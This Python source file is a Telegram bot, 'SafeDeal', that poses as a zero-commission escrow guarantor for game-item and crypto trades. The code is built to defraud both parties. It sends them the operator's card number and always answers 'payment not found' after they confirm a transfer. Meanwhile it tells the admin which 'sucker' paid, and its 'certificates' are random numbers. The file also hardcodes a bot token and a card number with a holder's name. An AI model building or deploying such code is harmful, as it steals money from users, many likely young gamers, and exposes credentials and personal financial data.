import asyncio, logging, random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

BOT_TOKEN = "8856958854:AAHUShuODrvX9xG5H8btqLnE1nhZDJNRryo"
ADMIN_ID = 7263901569
SUPPORT_USERNAME = "@safedeal_support"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_sessions = {}
pending_deals = {}
admin_data = {"requisites": "4177 4901 4338 9205\nГулумкан Д.", "deals_count": 0}

def generate_cert():
    return "CERT-" + str(random.randint(100000, 999999))

def start_kb():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой маркетплейс", callback_data="gaming")],
        [InlineKeyboardButton(text="💱 Крипта / Обмен", callback_data="crypto")],
        [InlineKeyboardButton(text="🔗 Присоединиться", callback_data="join")],
        [InlineKeyboardButton(text="📞 Саппорт", callback_data="support")]
    ])
    return kb

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Назад", callback_data="back")]])

def wait_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_deal")]])

def paid_kb(uid):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_" + str(uid))],
        [InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_" + str(uid))]
    ])

def admin_kb(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Реквизиты", callback_data="areq_" + deal_id)],
        [InlineKeyboardButton(text="💬 Написать", callback_data="amsg_" + deal_id)],
        [InlineKeyboardButton(text="✅ Завершить", callback_data="adone_" + deal_id)],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data="acancel_" + deal_id)]
    ])

@dp.message(Command("start"))
async def start(msg: types.Message):
    await msg.answer("🛡 <b>SafeDeal</b>\n0% комиссия\n\nВыберите раздел:", parse_mode=ParseMode.HTML, reply_markup=start_kb())

@dp.message(Command("reply"))
async def reply_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    parts = msg.text.split(maxsplit=2)
    if len(parts) < 3:
        await msg.answer("❌ /reply SD-12345 текст")
        return
    deal_id = parts[1]
    text = parts[2]
    deal = pending_deals.get(deal_id)
    if not deal:
        await msg.answer("❌ Не найдена")
        return
    for u in [deal["creator"], deal["partner"]]:
        if u:
            kb = paid_kb(u) if deal.get("req_sent") else wait_kb()
            await bot.send_message(u, "💬 <b>Гарант:</b>\n" + text, parse_mode=ParseMode.HTML, reply_markup=kb)
    await msg.answer("✅ Отправлено")

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID: return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Сменить реквизиты", callback_data="adm_changereq")],
        [InlineKeyboardButton(text="📋 Сделки", callback_data="adm_list")]
    ])
    await msg.answer("<b>Админ</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query(F.data == "adm_changereq")
async def change_req(call: types.CallbackQuery):
    user_sessions[call.from_user.id] = {"step": "changing_req"}
    await call.message.edit_text("💰 Введите реквизиты:", reply_markup=back_kb())

@dp.message(F.text, lambda msg: user_sessions.get(msg.from_user.id, {}).get("step") == "changing_req")
async def save_req(msg: types.Message):
    admin_data["requisites"] = msg.text
    del user_sessions[msg.from_user.id]
    await msg.answer("✅ Готово!")

@dp.callback_query(F.data == "adm_list")
async def list_deals(call: types.CallbackQuery):
    if not pending_deals:
        await call.message.edit_text("Нет сделок.", reply_markup=back_kb())
        return
    text = "<b>Сделки:</b>\n\n"
    for did in pending_deals:
        text += "▫️ " + did + "\n"
    await call.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.callback_query(F.data == "gaming")
async def gaming(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Roblox", callback_data="game_Roblox")],
        [InlineKeyboardButton(text="🎮 Brawl Stars", callback_data="game_BrawlStars")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
    ])
    await call.message.edit_text("<b>🎮 Игры</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query(F.data.startswith("game_"))
async def game_items(call: types.CallbackQuery):
    game = call.data.split("_", 1)[1]
    items = {
        "Roblox": ["Adopt Me", "MM2", "BloxFruits", "Robux"],
        "BrawlStars": ["Гемы", "Аккаунты", "Скины"]
    }
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="• " + i, callback_data="item_" + game + "_" + i)] for i in items.get(game, [])
    ] + [[InlineKeyboardButton(text="🔙 Назад", callback_data="gaming")]])
    await call.message.edit_text("<b>" + game + "</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query(F.data == "crypto")
async def crypto(call: types.CallbackQuery):
    user_sessions[call.from_user.id] = {"deal_id": "SD-" + str(random.randint(10000, 99999)), "type": "crypto", "step": "waiting_info"}
    await call.message.edit_text("📝 Введите условия:", reply_markup=back_kb())

@dp.callback_query(F.data.startswith("item_"))
async def item_deal(call: types.CallbackQuery):
    uid = call.from_user.id
    parts = call.data.split("_", 2)
    deal_id = "SD-" + str(random.randint(10000, 99999))
    user_sessions[uid] = {"deal_id": deal_id, "type": "game", "game": parts[1], "item": parts[2], "step": "waiting_info"}
    await call.message.edit_text("📝 Введите условия:", reply_markup=back_kb())

@dp.message(F.text, lambda msg: not msg.text.startswith("/") and user_sessions.get(msg.from_user.id, {}).get("step") == "waiting_info")
async def conditions(msg: types.Message):
    uid = msg.from_user.id
    deal_id = user_sessions[uid]["deal_id"]
    user_sessions[uid]["info"] = msg.text
    user_sessions[uid]["step"] = "waiting_partner"
    cert = generate_cert()
    pending_deals[deal_id] = {"creator": uid, "partner": None, "info1": msg.text, "req_sent": False, "cert": cert}
    await msg.answer("✅ <b>Сделка " + deal_id + " создана!</b>\n\n📋 Код: <code>" + deal_id + "</code>\n🛡 Сертификат: <code>" + cert + "</code>\n\nОтправьте код партнёру.", parse_mode=ParseMode.HTML, reply_markup=wait_kb())

@dp.callback_query(F.data == "join")
async def join(call: types.CallbackQuery):
    user_sessions[call.from_user.id] = {"step": "waiting_code"}
    await call.message.edit_text("🔗 Введите код:", reply_markup=back_kb())

@dp.message(F.text, lambda msg: user_sessions.get(msg.from_user.id, {}).get("step") == "waiting_code")
async def join_code(msg: types.Message):
    uid = msg.from_user.id
    code = msg.text.strip()
    if code not in pending_deals: return await msg.answer("❌ Не найдена")
    deal = pending_deals[code]
    if deal["partner"]: return await msg.answer("❌ Занята")
    if deal["creator"] == uid: return await msg.answer("❌ Нельзя")
    deal["partner"] = uid
    cid = deal["creator"]
    user_sessions[uid] = {"deal_id": code, "step": "in_deal"}
    user_sessions[cid]["step"] = "in_deal"
    await bot.send_message(ADMIN_ID, "💰 <b>СДЕЛКА " + code + "</b>\n\n👤 Лох 1: <code>" + str(cid) + "</code>\n👤 Лох 2: <code>" + str(uid) + "</code>\n🛡 <code>" + deal.get("cert","") + "</code>\n\n<i>/reply " + code + " текст</i>", parse_mode=ParseMode.HTML, reply_markup=admin_kb(code))
    for u in [cid, uid]:
        await bot.send_message(u, "✅ <b>Пара найдена!</b>\n\nСделка: " + code, parse_mode=ParseMode.HTML, reply_markup=wait_kb())

@dp.callback_query(F.data.startswith("areq_"))
async def send_reqs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID: return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.get(deal_id)
    if not deal: return
    deal["req_sent"] = True
    for u in [deal["creator"], deal["partner"]]:
        if u: await bot.send_message(u, "💰 <b>РЕКВИЗИТЫ</b>\n\n<pre>" + admin_data["requisites"] + "</pre>\n\n<i>Нажмите «Я оплатил» после перевода.</i>", parse_mode=ParseMode.HTML, reply_markup=paid_kb(u))
    await call.answer("✅ Отправлено!")

@dp.callback_query(F.data.startswith("paid_"))
async def paid(call: types.CallbackQuery):
    uid = int(call.data.split("_")[1])
    await call.message.edit_text("⏳ Проверяем...")
    await asyncio.sleep(5)
    await bot.send_message(ADMIN_ID, "⚠️ Лох " + str(uid) + " перевёл!")
    await call.message.answer("❌ Платёж не найден. Повторите.", reply_markup=paid_kb(uid))

@dp.callback_query(F.data.startswith("adone_"))
async def done(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID: return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.pop(deal_id, None)
    if deal:
        for u in [deal["creator"], deal["partner"]]:
            if u: await bot.send_message(u, "✅ <b>Сделка завершена!</b>", parse_mode=ParseMode.HTML)
    await call.answer("✅ Завершено!")

@dp.callback_query(F.data == "back")
async def back(call: types.CallbackQuery):
    if call.from_user.id in user_sessions:
        if user_sessions[call.from_user.id].get("step") == "in_deal":
            return await call.answer("❌ Вы в активной сделке!", show_alert=True)
        del user_sessions[call.from_user.id]
    await call.message.edit_text("🛡 <b>Меню</b>", parse_mode=ParseMode.HTML, reply_markup=start_kb())

@dp.callback_query(F.data == "support")
async def support(call: types.CallbackQuery):
    await call.answer("📞 " + SUPPORT_USERNAME + " (24/7)", show_alert=True)

@dp.callback_query(F.data.startswith("cancel_") or F.data == "cancel_deal")
async def cancel_lox(call: types.CallbackQuery):
    uid = call.from_user.id
    if call.data.startswith("cancel_"):
        uid = int(call.data.split("_")[1])
    did = user_sessions.get(uid, {}).get("deal_id")
    if did in pending_deals:
        deal = pending_deals.pop(did)
        other = deal["creator"] if uid == deal["partner"] else deal["partner"]
        if other: await bot.send_message(other, "❌ Участник отменил сделку.")
    if uid in user_sessions: del user_sessions[uid]
    await call.message.edit_text("❌ Отменено.")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    print("🛡 SafeDeal запущен!")
    asyncio.run(main())